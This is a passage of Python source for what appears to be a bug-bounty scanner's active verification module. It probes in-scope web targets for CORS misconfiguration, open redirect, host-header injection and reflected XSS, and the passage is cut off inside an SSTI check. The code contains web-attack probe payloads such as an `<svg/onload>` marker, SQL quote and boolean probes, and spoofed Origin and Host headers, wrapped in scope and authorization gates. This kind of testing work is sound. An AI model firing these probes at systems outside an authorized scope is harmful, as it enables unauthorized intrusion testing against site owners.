"""GreyIQ BugHunter — opt-in ACTIVE proof-capture verification.

The static/passive scanners produce *leads* that cap at proof status "candidate"
(a static tool can't exploit). This layer closes the loop for the subset of
classes that are provable with a single benign request: it fires at most one
crafted, **non-destructive** GET/HEAD/OPTIONS per check, captures the exact proof
artifact the impact model's ``proof_obligation`` names, validates it against a
same-run **negative control**, and returns a ``status:'confirmed'`` proof dict
(with the captured request/response) for the orchestrator to merge — so the
report renders "Confirmed" with no report.py change.

SAFETY (this is the one place a bounty tool could become a weapon):
  - Double-gated: only runs when the caller passes ``active=True`` AND the hunt is
    ``authorized=True`` AND the target is a URL. A default hunt sends ZERO crafted
    requests.
  - Scope-bound, fail-closed: only probes a host the operator NAMED in the hunt
    scope (or an env allowlist, or — for your own infra — a private host with
    GREYIQ_SCAN_ALLOW_PRIVATE_URLS=1). Any other host is downgraded to passive-only.
  - No new egress path: every request reuses web_scan_service._guard_url + the same
    settings, so SSRF/private-host/metadata/port/IDN guards apply identically.
    Redirects are NEVER followed off-host — the first 30x Location is *captured*.
  - Methods are GET/HEAD/OPTIONS only with benign idempotent markers (a single
    quote to elicit a SQL error, an `AND '1'='1` vs `AND '1'='2` boolean differential
    that reads ONE bit and extracts no data, a `{{7*7}}` arithmetic expression to
    detect a template engine, a `<svg/onload>` reflection probe, an encoded-CRLF +
    custom-header marker to detect header injection — all inspected, never executed by
    us); never a state-changing verb/parameter, never a file-read/RCE payload, never
    fuzzing/wordlists.
  - OPT-IN time-based blind SQLi (``time_based=True``) is the one exception to the
    "never executed" rule: it injects a single FIXED, bounded ``SLEEP(4)`` (well under
    the fetch timeout, no amplification), reads ZERO data (one timing bit), excludes the
    governor throttle from its measurement, and confirms only on a stable multi-trial
    differential against a fast ``SLEEP(0)`` negative control. Off by default.
  - Open-bucket exposure only GET-probes a cloud bucket whose HOST is itself in the
    hunt scope; a referenced third-party bucket is reported as a candidate, never probed.
  - A per-host token-bucket governor + a per-hunt request budget bound the load.
  - Every captured string is redacted before it lands in a proof artifact.
  - Fail-closed proof: 'confirmed' needs a positive observation AND a control
    differential; otherwise it degrades to 'candidate'.
"""

from __future__ import annotations

import base64
import binascii
import hashlib
import hmac
import json
import re
import time
from typing import Any, Callable
from urllib.error import HTTPError, URLError
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse
from urllib.request import HTTPRedirectHandler, Request, build_opener

from bughunter.code_scanner.redaction import redact_text
from bughunter.rate_limit import HostRateGovernor
from bughunter.registrable_domain import is_bare_public_suffix, registrable_domain
from bughunter.scan_auth import AuthContext, auth_headers_for
from bughunter.settings import get_settings
from bughunter.web_ingest import (
    WebsiteFetchError,
    _ascii_hostname,
    _host_is_private,
    guarded_dns_scope,
    normalize_website_url,
)
from bughunter.web_scan_service import (
    _ERROR_PATTERNS,
    _USER_AGENT,
    _consume,
    _guard_url,
)

# A reserved, non-resolving marker host (RFC 2606 example.* is reserved and will
# never point at a victim). Used as the off-origin target for redirect / CORS /
# host-header proofs so nothing is ever actually sent to it.
_MARKER_HOST = "greyiq-marker.example"
_MARKER_ORIGIN = f"https://{_MARKER_HOST}"
_REDIRECT_PARAMS = ("next", "returnurl", "return_url", "redirect", "redirect_uri", "redirecturl", "url", "continue", "dest", "destination", "returnto", "return_to")
_SAFE_METHODS = {"GET", "HEAD", "OPTIONS"}
# SQL-specific error signatures only — a generic stack trace is not SQL injection.
_SQL_ERROR_RE = re.compile(
    r"SQLSTATE\[|\bORA-\d{5}\b|SQL syntax.{0,40}near|\bpsql:|PostgreSQL.{0,30}ERROR|"
    r"Microsoft OLE DB Provider for SQL Server|Unclosed quotation mark|"
    r"You have an error in your SQL syntax|SQLite3?::|sqlite3.OperationalError",
    re.IGNORECASE,
)
# High-signal NoSQL backend error banners ONLY — unambiguous Mongo/Mongoose/BSON/PyMongo/
# Couchbase errors. Generic JS/stack traces are deliberately excluded (they'd false-positive
# against the engine's confirm-grade promise). Matched only with a negative control.
_NOSQL_ERROR_RE = re.compile(
    r"Mongo(?:Server|Network|Parse)?Error"
    r"|MongooseError"
    r"|BSON(?:Type)?Error"
    r"|Cast(?:Error)?\s+to\s+(?:ObjectId|Number|Boolean|Date|Buffer|String)\s+failed"
    r"|E11000\s+duplicate\s+key"
    r"|pymongo(?:\.errors)?\b"
    r"|OperationFailure"
    r"|N1QL(?:Error)?|CouchbaseError",
    re.IGNORECASE,
)
# A stable marker token (no Math.random needed): unique enough across one host's
# response surface, deterministic for tests.
_MARK = "gq7x4q2v"
# A JWT-shaped value: three base64url segments (the third may be empty for an
# already-unsigned token).
_JWT_RE = re.compile(r"^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$")


class _ActiveError(Exception):
    """Internal: a single active request failed (network/guard) — skip that check."""


class _RateLimited(Exception):
    """The per-host request budget is exhausted. Deliberately NOT an _ActiveError so
    the per-check ``except _ActiveError`` doesn't swallow it — it must propagate up to
    verify_active and stop the whole active pass (fail closed, no bursting)."""


class _NoRedirect(HTTPRedirectHandler):
    """Capture, never follow: returning None makes urllib raise HTTPError for a
    3xx so we can read the Location without an off-host hop."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):  # noqa: ANN001, N802
        return None


def _registrable(host: str) -> str:
    """Best-effort, public-suffix-AWARE eTLD+1. Good enough for a scope-naming check;
    the operator names example.com or the full host. See registrable_domain.py: this is
    NOT last-two-labels for known multi-label suffixes (foo.co.uk, myapp.herokuapp.com)."""
    return registrable_domain(host)


def _scope_hosts(scope: str) -> set[str]:
    """Extract dotted host tokens from free-text scope, normalizing pasted URLs and
    `*.`-wildcards to bare hosts. Used for EXACT / proper-suffix matching — never a
    substring test (so 'example.com' can't match scope text 'notexample.com')."""
    hosts: set[str] = set()
    for raw in re.split(r"[\s,;]+", (scope or "").lower()):
        token = raw.strip().strip("()<>[]\"'")
        if not token:
            continue
        token = (urlparse(token).hostname or "") if "://" in token else token.split("/", 1)[0]
        token = token.lstrip("*").lstrip(".")
        if token and "." in token:  # require a dotted host, not a bare word
            hosts.add(token)
    return hosts


def host_in_active_scope(host: str, scope: str, settings: Any) -> bool:
    """Fail-closed scope binding: a host is eligible for ACTIVE probing only if the
    operator named it (its registrable domain or full host appears in the scope
    text), or it matches the env allowlist, or it's your own private/loopback infra
    with private URLs explicitly allowed. settings.excluded_hosts (a saved program's
    out_of_scope_hosts, when the caller resolved one) is checked FIRST and always wins
    over every positive match below — an exclusion the operator set can never be
    silently overridden by a broader scope_text wildcard."""
    cleaned = (host or "").strip().lower().strip("[]")
    if not cleaned:
        return False
    reg = _registrable(cleaned)
    for excluded in getattr(settings, "excluded_hosts", ()) or ():
        token = str(excluded or "").strip().lower().strip("[]").lstrip("*").lstrip(".")
        if not token:
            continue
        if cleaned == token or cleaned.endswith("." + token) or reg == token:
            return False
    # No-DNS checks first: the operator named the host. Match host TOKENS exactly or
    # by proper dotted suffix — not a substring of the free text (which would let
    # 'example.com' match scope 'notexample.com' and probe an out-of-scope host).
    for token in _scope_hosts(scope):
        if is_bare_public_suffix(token):
            # The token IS itself a known multi-label public suffix (e.g.
            # 'herokuapp.com', 'co.uk') -- never someone's own apex, so naming it bare
            # in free-text scope can NEVER legitimately authorize the whole shared
            # platform (every unrelated tenant's subdomain would otherwise match the
            # dotted-suffix wildcard below). Skip it entirely for this token.
            continue
        if cleaned == token or cleaned.endswith("." + token) or reg == token:
            return True
    for suffix in getattr(settings, "active_scan_allowlist", ()):  # host-suffix allowlist
        if cleaned == suffix or cleaned.endswith("." + suffix):
            return True
    # Own infra: a private/loopback host is in scope only when private URLs are
    # explicitly allowed. This resolves DNS, so do it last and tolerate failure.
    if getattr(settings, "allow_private_urls", False):
        try:
            if _host_is_private(_ascii_hostname(cleaned)):
                return True
        except WebsiteFetchError:
            return False
    return False


def _with_query(url: str, params: dict[str, str]) -> str:
    parsed = urlparse(url)
    existing = dict(parse_qsl(parsed.query, keep_blank_values=True))
    existing.update(params)
    return urlunparse(parsed._replace(query=urlencode(existing)))


# A valid query-parameter token (incl. PHP/Rails-style `user[id]` / `filter.name`).
# Operator- and recon-supplied param names are validated against this before they ever
# become a probe key — a malformed token is dropped rather than injected.
_PARAM_NAME_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_\-\[\]\.]{0,39}$")
_MAX_DISCOVERED_PARAMS = 40
# Param NAMES that signal a redirect/forward target (used to pick which discovered
# params the redirect/CRLF checks bite on, without fuzzing every unrelated param).
_REDIRECT_HINTS = ("redirect", "return", "next", "dest", "continue", "callback", "forward", "goto", "url")


def _clean_param_names(names: Any) -> list[str]:
    """Sanitize + bound caller-supplied (recon/operator) param names before they become
    probe keys: keep only well-formed tokens, dedupe case-insensitively, cap the count.
    These are names DISCOVERED from the target's own JS/HTML (evidence the param exists),
    not a blind wordlist."""
    out: list[str] = []
    seen: set[str] = set()
    for raw in names or []:
        name = str(raw or "").strip()
        if not _PARAM_NAME_RE.match(name):
            continue
        key = name.lower()
        if key in seen:
            continue
        seen.add(key)
        out.append(name)
        if len(out) >= _MAX_DISCOVERED_PARAMS:
            break
    return out


def _candidate_params(url: str, extra: list[str] | None, default: tuple[str, ...], limit: int) -> list[str]:
    """Ordered, deduped parameter names a param-keyed check should probe: params already
    present in the URL FIRST (most likely live), then recon-discovered names, then a small
    built-in default — capped at ``limit`` (the SAME small per-check cap as before, so an
    already-parametered URL costs the same number of requests; only param-poor endpoints,
    which previously tested nothing, gain coverage). Pass ``default=()`` for the SQLi checks
    so a param-less endpoint with no discovered name still bails — they never invent an
    injection point."""
    out: list[str] = []
    seen: set[str] = set()

    def _add(name: str) -> None:
        clean = (name or "").strip()
        key = clean.lower()
        if clean and key not in seen:
            seen.add(key)
            out.append(clean)

    for key, _ in parse_qsl(urlparse(url).query, keep_blank_values=True):
        _add(key)
    for name in extra or []:
        _add(name)
    if not out:
        for name in default:
            _add(name)
    return out[:limit]


def _redirect_candidates(url: str, extra: list[str] | None, default: tuple[str, ...], limit: int) -> list[str]:
    """Redirect/CRLF candidates: redirect-NAMED params already in the URL first, then
    recon-discovered params whose NAME looks like a redirect/forward target, then the
    built-in defaults — so a custom-named redirect param the app actually uses gets tested
    without firing at every unrelated param."""
    existing = {k.lower() for k, _ in parse_qsl(urlparse(url).query, keep_blank_values=True)}
    out: list[str] = []
    seen: set[str] = set()

    def _add(name: str) -> None:
        clean = (name or "").strip()
        key = clean.lower()
        if clean and key not in seen:
            seen.add(key)
            out.append(clean)

    for param in _REDIRECT_PARAMS:
        if param in existing:
            _add(param)
    for name in extra or []:
        if any(hint in (name or "").lower() for hint in _REDIRECT_HINTS):
            _add(name)
    if not out:
        for name in default:
            _add(name)
    return out[:limit]


# A bounded retry for CONNECTION-LEVEL transient failures only (reset TCP, a DNS
# hiccup, a timeout) -- never for an HTTPError (any status code, including 502/503),
# which is a real answer from the server that the differential checks (bool-SQLi,
# error-SQLi, CORS reflection) need to see as-is. One retry, short fixed backoff --
# a bug-bounty target shouldn't get hammered even by a benign probe.
_MAX_FETCH_ATTEMPTS = 2
_FETCH_RETRY_BACKOFF_S = 0.4


class _Http:
    """Bounded, SSRF-guarded, non-redirect-following HTTP for active checks. Two
    independent ceilings: a per-hunt request budget (``max_requests``, counted here)
    and a process-wide per-host token bucket (the governor)."""

    def __init__(self, settings: Any, governor: HostRateGovernor, max_requests: int = 12,
                 auth: AuthContext | None = None) -> None:
        self.settings = settings
        self.governor = governor
        self.max_requests = max(1, int(max_requests))
        self.auth = auth  # operator session, attached SAME-SITE only (never to a foreign bucket)
        self.sent = 0
        self.opener = build_opener(_NoRedirect())

    def fetch(self, url: str, *, method: str = "GET", extra_headers: dict[str, str] | None = None) -> dict[str, Any]:
        method = method.upper()
        if method not in _SAFE_METHODS:  # belt-and-suspenders; callers never pass others
            raise _ActiveError(f"refused non-idempotent method {method}")
        if self.sent >= self.max_requests:  # per-hunt budget, independent of the host bucket
            raise _RateLimited()
        # guarded_dns_scope() covers guard-check through the real connect so the DNS
        # pin _guard_url() installs is still in effect when the actual HTTP connect
        # (a few lines down) independently re-resolves the same hostname — closing the
        # DNS-rebinding check-then-connect gap. Every active check funnels through
        # this ONE fetch(), so fixing it here covers the whole active-verify engine.
        with guarded_dns_scope():
            sanitized = _guard_url(normalize_website_url(url), self.settings.allow_private_urls, self.settings.web_allowed_ports)
            host = urlparse(sanitized).hostname or ""
            if not self.governor.throttle(host):
                raise _RateLimited()
            self.sent += 1
            headers = {"User-Agent": _USER_AGENT, "Accept": "*/*", "Accept-Encoding": "identity"}
            # Operator auth is attached ONLY when this request's host is same-site as the
            # bound host — so the open-bucket check's foreign-host fetch (and any other
            # off-target host) never receives the session.
            headers.update(auth_headers_for(host, self.auth))
            if extra_headers:
                headers.update(extra_headers)
            request = Request(sanitized, headers=headers, method=method)
            # This retry loop is still ONE logical probe -- self.sent and the governor
            # token were already spent once above, and are never spent again here, no
            # matter how many attempts a single fetch() call takes.
            for attempt in range(1, _MAX_FETCH_ATTEMPTS + 1):
                # Time ONLY the request (not the governor throttle, and not a prior
                # attempt's backoff sleep), so a time-based check measures the server,
                # not our own rate-limit/retry delay.
                started = time.monotonic()
                try:
                    with self.opener.open(request, timeout=self.settings.web_fetch_timeout_seconds) as resp:
                        consumed = _consume(resp, self.settings)
                        consumed["final_url"] = resp.geturl()
                        consumed["location"] = resp.headers.get("Location") if resp.headers else None
                        consumed["elapsed"] = time.monotonic() - started
                        return consumed
                except HTTPError as exc:
                    # A 3xx (captured, not followed) or 4xx/5xx is a valid observation
                    # from the server -- never retried.
                    consumed = _consume(exc, self.settings)
                    consumed["final_url"] = sanitized
                    consumed["location"] = exc.headers.get("Location") if exc.headers else None
                    consumed["elapsed"] = time.monotonic() - started
                    return consumed
                except (URLError, TimeoutError, OSError) as exc:
                    if attempt >= _MAX_FETCH_ATTEMPTS:
                        raise _ActiveError(str(exc)) from exc
                    time.sleep(_FETCH_RETRY_BACKOFF_S * attempt)


def _redact(value: str) -> str:
    return redact_text(str(value or ""))[0]


def _proof(status: str, **fields: Any) -> dict[str, Any]:
    base = {
        "status": status, "method": "", "actor": "unauthenticated", "affected_asset": "",
        "observed_result": "", "control_result": "", "evidence": "", "limitations": "",
    }
    base.update({k: _redact(v) if isinstance(v, str) else v for k, v in fields.items()})
    return base


def _finding(rule_id: str, title: str, severity: str, category: str, class_hint: str, url: str,
             proof: dict[str, Any], proof_evidence: dict[str, str], cvss: dict[str, Any] | None = None) -> dict[str, Any]:
    return {
        "rule_id": rule_id, "title": title, "severity": severity, "confidence": "high",
        "category": category, "file_path": url, "line_start": 1, "line_end": 1,
        "snippet": _redact(proof.get("observed_result") or "")[:240],
        "remediation": "", "redacted": True,
        "proof_evidence": {k: _redact(v) for k, v in proof_evidence.items() if str(v or "").strip()},
        "_active_proof": proof,
        "_active_cvss": cvss,
        "_active_class_hint": class_hint,
    }


# ----------------------------- individual checks -----------------------------
# Each returns a finding dict (confirmed/candidate) or None. Conservative: a
# 'confirmed' status requires a positive observation AND a control differential.

def _check_cors(http: _Http, url: str) -> dict[str, Any] | None:
    try:
        probe = http.fetch(url, extra_headers={"Origin": _MARKER_ORIGIN})
        control = http.fetch(url, extra_headers={"Origin": f"https://{urlparse(url).hostname}"})
    except _ActiveError:
        return None
    acao = (probe["headers"].get("access-control-allow-origin") or "").strip()
    acac = (probe["headers"].get("access-control-allow-credentials") or "").strip().lower()
    ctrl_acao = (control["headers"].get("access-control-allow-origin") or "").strip()
    reflects_marker = acao == _MARKER_ORIGIN
    credentialed = acac == "true"
    # Confirmed: the response reflects the ATTACKER origin (not a static value/wildcard)
    # and allows credentials — a real cross-origin credentialed read. The control
    # (a different origin) reflecting differently proves it's Origin-driven.
    if reflects_marker and credentialed and ctrl_acao != acao:
        proof = _proof(
            "confirmed", method="GET with Origin: " + _MARKER_ORIGIN, affected_asset="authenticated cross-origin API responses",
            observed_result=f"Access-Control-Allow-Origin reflected the attacker origin ({acao}) with Allow-Credentials: true",
            control_result=f"a different Origin was reflected as {ctrl_acao} — reflection is attacker-controlled, not static",
            evidence=f"ACAO={acao}; ACAC={acac}",
        )
        ev = {"request_line": f"GET {url}", "request_header": f"Origin: {_MARKER_ORIGIN}",
              "response_status": f"HTTP {probe['status']}", "matched_value": f"Access-Control-Allow-Origin: {acao}; Access-Control-Allow-Credentials: {acac}"}
        return _finding("active.cors-reflection", "CORS reflects attacker Origin with credentials", "high",
                        "cors", "cors", url, proof, ev)
    if reflects_marker and not credentialed:
        proof = _proof("candidate", method="GET with attacker Origin",
                       observed_result=f"ACAO reflected {acao} but Allow-Credentials was not true",
                       limitations="Without Allow-Credentials, a credentialed cross-origin read is not proven.")
        ev = {"request_line": f"GET {url}", "request_header": f"Origin: {_MARKER_ORIGIN}", "response_status": f"HTTP {probe['status']}", "matched_value": f"ACAO: {acao}"}
        return _finding("active.cors-reflection", "CORS reflects arbitrary Origin (no credentials)", "low", "cors", "cors", url, proof, ev)

    # Variant 2 — Origin: null trusted with credentials (reachable from a sandboxed
    # iframe/data-URI). Confirm only when a DIFFERENT benign Origin does NOT also yield
    # null, so 'null' is genuinely attacker-reachable, not a static value.
    try:
        null_probe = http.fetch(url, extra_headers={"Origin": "null"})
    except _ActiveError:
        null_probe = None
    if null_probe is not None:
        n_acao = (null_probe["headers"].get("access-control-allow-origin") or "").strip()
        n_acac = (null_probe["headers"].get("access-control-allow-credentials") or "").strip().lower()
        if n_acao == "null" and n_acac == "true" and ctrl_acao != "null":
            proof = _proof(
                "confirmed", method="GET with Origin: null", affected_asset="authenticated API responses (readable from a sandboxed iframe / data: URI)",
                observed_result="Access-Control-Allow-Origin: null was returned with Allow-Credentials: true",
                control_result=f"a normal Origin was reflected as {ctrl_acao or '(none)'} — 'null' is specially trusted",
                evidence=f"ACAO=null; ACAC={n_acac}",
            )
            ev = {"request_line": f"GET {url}", "request_header": "Origin: null", "response_status": f"HTTP {null_probe['status']}",
                  "matched_value": "Access-Control-Allow-Origin: null; Access-Control-Allow-Credentials: true"}
            return _finding("active.cors-reflection", "CORS trusts Origin: null with credentials", "high", "cors", "cors", url, proof, ev)

    # Variant 3 — attacker-controlled subdomain of the in-scope host reflected with
    # credentials (a takeover/XSS on any sibling subdomain then reads this API).
    host = urlparse(url).hostname or ""
    if host:
        sub_origin = f"https://{_MARK}.{host}"
        try:
            sub_probe = http.fetch(url, extra_headers={"Origin": sub_origin})
        except _ActiveError:
            sub_probe = None
        if sub_probe is not None:
            s_acao = (sub_probe["headers"].get("access-control-allow-origin") or "").strip()
            s_acac = (sub_probe["headers"].get("access-control-allow-credentials") or "").strip().lower()
            if s_acao == sub_origin and s_acac == "true" and ctrl_acao != sub_origin:
                proof = _proof(
                    "confirmed", method=f"GET with Origin: {sub_origin}", affected_asset="authenticated API responses readable from any subdomain of the target",
                    observed_result=f"an arbitrary subdomain Origin ({sub_origin}) was reflected with Allow-Credentials: true",
                    control_result=f"a different Origin was reflected as {ctrl_acao or '(none)'} — any subdomain is trusted",
                    evidence=f"ACAO={sub_origin}; ACAC={s_acac}",
                )
                ev = {"request_line": f"GET {url}", "request_header": f"Origin: {sub_origin}", "response_status": f"HTTP {sub_probe['status']}",
                      "matched_value": f"Access-Control-Allow-Origin: {sub_origin}; Access-Control-Allow-Credentials: true"}
                return _finding("active.cors-reflection", "CORS trusts arbitrary subdomain Origin with credentials", "high", "cors", "cors", url, proof, ev)
    return None


def _check_open_redirect(http: _Http, url: str, extra_params: list[str] | None = None) -> dict[str, Any] | None:
    candidates = _redirect_candidates(url, extra_params, ("next", "redirect", "url"), 3)
    for param in candidates:
        try:
            probe = http.fetch(_with_query(url, {param: _MARKER_ORIGIN + "/"}))
        except _ActiveError:
            continue
        location = (probe.get("location") or "").strip()
        if not location:
            continue
        # A protocol-relative Location ('//evil/') is a fully browser-exploitable open
        # redirect — one of the most common shapes — but carries no '://', so it must be
        # normalized (leading '//' -> 'https://') BEFORE host extraction, or urlparse
        # mis-parses 'http://x' + location into host='x' and never sees the real target.
        if location.startswith("//"):
            parse_target = "https:" + location
        elif "://" in location:
            parse_target = location
        else:
            parse_target = "http://x" + location
        loc_host = urlparse(parse_target).hostname or ""
        # Gate strictly on the parsed HOST equalling the marker (protocol-relative and absolute
        # forms are already normalized above, so loc_host is correct for both). The old
        # startswith(_MARKER_ORIGIN) / startswith('//'+marker) fallbacks lacked a host boundary,
        # so a redirect to the target's OWN subdomain whose label merely begins with the marker
        # (e.g. https://greyiq-marker.example.victim.com/) falsely reported a confirmed EXTERNAL
        # open redirect — a bogus, unsubmittable finding.
        if loc_host == _MARKER_HOST:
            try:
                control = http.fetch(_with_query(url, {param: "/greyiq-control"}))
            except _ActiveError:
                control = {"location": ""}
            ctrl_loc = (control.get("location") or "").strip()
            if _MARKER_HOST not in ctrl_loc:
                proof = _proof(
                    "confirmed", method=f"GET with {param}={_MARKER_ORIGIN}/", affected_asset="users following the link; tokens passed through the redirect",
                    observed_result=f"the server issued a {probe['status']} redirect to the external host via the '{param}' parameter (Location: {location})",
                    control_result=f"a same-origin '{param}' value redirected to {ctrl_loc or '(same origin)'} — the external host is attacker-supplied",
                    evidence=f"Location: {location}",
                )
                ev = {"request_line": f"GET {_with_query(url, {param: _MARKER_ORIGIN + '/'})}", "response_status": f"HTTP {probe['status']}", "matched_value": f"Location: {location}"}
                return _finding("active.open-redirect", f"Open redirect via '{param}' parameter", "medium", "redirect", "redirect", url, proof, ev)
    return None


def _check_clickjacking(http: _Http, url: str, fetched: dict[str, Any] | None) -> dict[str, Any] | None:
    try:
        resp = fetched or http.fetch(url)
    except _ActiveError:
        return None
    headers = resp["headers"]
    xfo = headers.get("x-frame-options")
    csp = (headers.get("content-security-policy") or "").lower()
    framable = not xfo and "frame-ancestors" not in csp
    if not framable:
        return None
    # A header inspection proves the page is FRAMABLE, but not that a working
    # clickjacking attack exists (frame-busting JS / no sensitive action). With no
    # same-run differential to capture, this is an honest 'candidate', not confirmed.
    proof = _proof(
        "candidate", method="GET (response headers inspected)", affected_asset="users of the page (UI redress / clickjacking)",
        observed_result="the response sets neither X-Frame-Options nor a CSP frame-ancestors directive, so the page is framable",
        limitations="Framability is shown from headers; a working clickjacking attack is not yet proven.",
        proof_obligation="Build a minimal HTML page that frames the target and show a sensitive action is clickable through the overlay.",
        evidence="X-Frame-Options: (absent); CSP frame-ancestors: (absent)",
    )
    ev = {"request_line": f"GET {url}", "response_status": f"HTTP {resp['status']}", "matched_value": "no X-Frame-Options, no CSP frame-ancestors"}
    return _finding("active.clickjacking", "Page is framable (clickjacking candidate)", "low", "headers", "headers", url, proof, ev)


_FORM_RE = re.compile(r"<form\b[^>]*>.*?</form>", re.IGNORECASE | re.DOTALL)
_METHOD_POST_RE = re.compile(r"method\s*=\s*[\"']?\s*post", re.IGNORECASE)
# Anti-CSRF token field names (hidden input) or a page-wide meta token.
_CSRF_TOKEN_RE = re.compile(
    r"name\s*=\s*[\"']?(?:[a-z0-9_\-]*x?csrf[a-z0-9_\-]*|authenticity_token|"
    r"__requestverificationtoken|_token|anti[\-_]?forgery[a-z]*|nonce)",
    re.IGNORECASE,
)
_META_CSRF_RE = re.compile(r"<meta[^>]+name\s*=\s*[\"']csrf-token[\"']", re.IGNORECASE)


def _check_csrf(landing: dict[str, Any] | None, url: str) -> dict[str, Any] | None:
    """Candidate-grade CSRF: a state-changing POST form served with NO anti-CSRF token.
    Passive (GET, form inspection). Honest tiering — modern browsers default cookies to
    SameSite=Lax, which already blocks cross-site POST, so a missing token alone is rarely
    exploitable. A tokenless POST form whose session cookie is explicitly ``SameSite=None``
    is a MEDIUM candidate; if a Lax/Strict cookie is observed it's skipped (protected);
    otherwise a LOW candidate the operator must verify."""
    if not landing:
        return None
    body = landing.get("body") or ""
    if _META_CSRF_RE.search(body):
        return None  # a page-wide CSRF meta token (AJAX frameworks attach it to POSTs)
    tokenless = any(
        _METHOD_POST_RE.search(m.group(0)) and not _CSRF_TOKEN_RE.search(m.group(0))
        for m in _FORM_RE.finditer(body)
    )
    if not tokenless:
        return None
    cookies = " ".join(str(c) for c in (landing.get("cookies") or [])).lower()
    samesite_none = "samesite=none" in cookies
    samesite_lax_strict = ("samesite=lax" in cookies) or ("samesite=strict" in cookies)
    if samesite_lax_strict and not samesite_none:
        return None  # the session cookie is SameSite Lax/Strict -> cross-site POST blocked
    sev = "medium" if samesite_none else "low"
    proof = _proof(
        "candidate", method="GET (passive form inspection)",
        affected_asset="authenticated users tricked into submitting this form cross-site",
        observed_result="a state-changing POST form is served with no anti-CSRF token field",
        limitations=("Browsers default cookies to SameSite=Lax, which blocks cross-site POST; a missing token is only "
                     "exploitable if the session cookie is SameSite=None or the action is otherwise reachable cross-site. "
                     + ("A response cookie is set SameSite=None (cross-site cookies allowed)."
                        if samesite_none else "The session cookie's SameSite policy was not observed here — verify it.")),
        proof_obligation="Host a page that auto-submits a forged cross-site POST with the victim's cookies and confirm the state change.",
        evidence="<form method=post> with no csrf/xsrf/authenticity_token field" + ("; Set-Cookie SameSite=None" if samesite_none else ""),
    )
    ev = {"request_line": f"GET {url}", "matched_value": "POST form with no anti-CSRF token" + ("; a cookie is SameSite=None" if samesite_none else "")}
    return _finding("active.csrf-missing-token", "State-changing form without anti-CSRF token", sev, "csrf", "csrf", url, proof, ev)


def _check_host_header(http: _Http, url: str) -> dict[str, Any] | None:
    # Reverse proxies / CDNs commonly PIN the real Host but trust X-Forwarded-Host for building
    # absolute URLs (the classic password-reset-poisoning vector) — so a raw Host probe misses
    # every app behind such a proxy. Probe raw Host first, then X-Forwarded-Host only if the raw
    # Host wasn't reflected. The proxy overrides Host before the app sees it, so XFH is the shape
    # that actually reaches the modern app.
    probe_header = "Host"
    try:
        probe = http.fetch(url, extra_headers={"Host": _MARKER_HOST})
    except _ActiveError:
        return None
    location = probe.get("location") or ""
    body = probe.get("body") or ""
    if _MARKER_HOST not in location and _MARKER_HOST not in body:
        try:
            xfh = http.fetch(url, extra_headers={"X-Forwarded-Host": _MARKER_HOST})
        except _ActiveError:
            return None
        location = xfh.get("location") or ""
        body = xfh.get("body") or ""
        if _MARKER_HOST not in location and _MARKER_HOST not in body:
            return None
        probe, probe_header = xfh, "X-Forwarded-Host"
    try:
        control = http.fetch(url)
    except _ActiveError:
        control = {"location": "", "body": ""}
    if _MARKER_HOST in (control.get("location") or "") or _MARKER_HOST in (control.get("body") or ""):
        return None  # marker present without our header → not header-driven
    in_location = _MARKER_HOST in location
    where = "Location header" if in_location else "response body"
    if in_location:
        # Reflected into a redirect Location is genuinely actionable (password-reset
        # poisoning, cache poisoning) — confirmed.
        proof = _proof(
            "confirmed", method=f"GET with {probe_header}: {_MARKER_HOST}", affected_asset="absolute links / redirects (password-reset poisoning, cache poisoning)",
            observed_result=f"the attacker-supplied {probe_header} header was reflected into the Location header",
            control_result="the real Host did not produce the marker — the value is attacker-controlled",
            evidence=f"marker host echoed in the Location header (via {probe_header})",
        )
        sev = "medium"
    else:
        # Body-only reflection is extremely common and usually harmless — candidate.
        proof = _proof(
            "candidate", method=f"GET with {probe_header}: {_MARKER_HOST}",
            observed_result=f"the attacker-supplied {probe_header} header was reflected into the response body",
            control_result="the real Host did not produce the marker — the value is attacker-controlled",
            limitations="Body-only reflection is common and usually harmless; it is actionable only where that value builds a security-relevant absolute URL (e.g. a password-reset link) or a cacheable response.",
            proof_obligation="Show the reflected host lands in a password-reset/confirmation link or a cacheable response — not just printed in the page.",
        )
        sev = "low"
    ev = {"request_line": f"GET {url}", "request_header": f"{probe_header}: {_MARKER_HOST}", "response_status": f"HTTP {probe['status']}", "matched_value": f"{_MARKER_HOST} in {where}"}
    return _finding("active.host-header-injection", "Host / X-Forwarded-Host reflected (host-header injection)", sev, "redirect", "redirect", url, proof, ev)


def _check_reflected_xss(http: _Http, url: str, extra_params: list[str] | None = None) -> dict[str, Any] | None:
    params = _candidate_params(url, extra_params, ("q",), 2)
    marker_payload = f"{_MARK}<svg/onload=1>"
    for param in params:
        try:
            probe = http.fetch(_with_query(url, {param: marker_payload}))
            control = http.fetch(_with_query(url, {param: _MARK}))
        except _ActiveError:
            continue
        body, ctrl_body = probe.get("body") or "", control.get("body") or ""
        ctype = (probe["headers"].get("content-type") or "").lower()
        html_context = (not ctype) or "html" in ctype or "xml" in ctype
        # Confirmed: the special-char payload reflects UNESCAPED (a real injection
        # point), the plain marker reflects in the control (the param is echoed, ruling
        # out a coincidental match), AND the response is HTML-renderable — a verbatim
        # reflection into application/json or text/plain is not browser-executable.
        # We INSPECT the string; nothing executes.
        if marker_payload in body and _MARK in ctrl_body and f"{_MARK}&lt;" not in body and html_context:
            proof = _proof(
                "confirmed", method=f"GET with {param}={marker_payload}", affected_asset="victim sessions/cookies and any action the victim can take",
                observed_result=f"the '{param}' parameter reflected the payload UNESCAPED into the response (the `<svg/onload>` markup was not HTML-encoded)",
                control_result=f"a plain marker reflected too, confirming '{param}' is echoed — the difference is the unescaped special characters",
                evidence="reflected payload appears raw (not entity-encoded) in the response body",
            )
            ev = {"request_line": f"GET {_with_query(url, {param: marker_payload})}", "response_status": f"HTTP {probe['status']}", "matched_value": "unescaped reflection of <svg/onload=...>"}
            return _finding("active.reflected-xss", f"Reflected XSS via '{param}' parameter", "high", "client_sink", "xss", url, proof, ev)
    return None


def _check_ssti(http: _Http, url: str, extra_params: list[str] | None = None) -> dict[str, Any] | None:
    params = _candidate_params(url, extra_params, ("q",), 2)
    # Probe the common template engines in ONE request — each 7*7 expression tagged with its OWN
    # adjacent marker so an evaluated 49 is unambiguous, attributable to the engine, and can't
    # coincide with page text. Covers Jinja/Twig, Freemarker/JSP-EL, ERB/EJS, Thymeleaf/Ruby.
